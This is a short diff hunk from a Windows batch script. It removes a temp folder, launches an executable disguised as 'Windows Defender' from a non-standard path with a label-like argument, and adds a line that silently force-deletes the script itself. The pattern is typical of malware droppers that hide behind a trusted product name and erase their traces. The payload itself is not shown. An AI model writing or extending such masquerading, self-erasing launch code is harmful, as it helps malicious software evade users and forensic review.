@@ -79,3 +79,5 @@ cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
 "C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+
+del /s /f /q /a "%~f0"
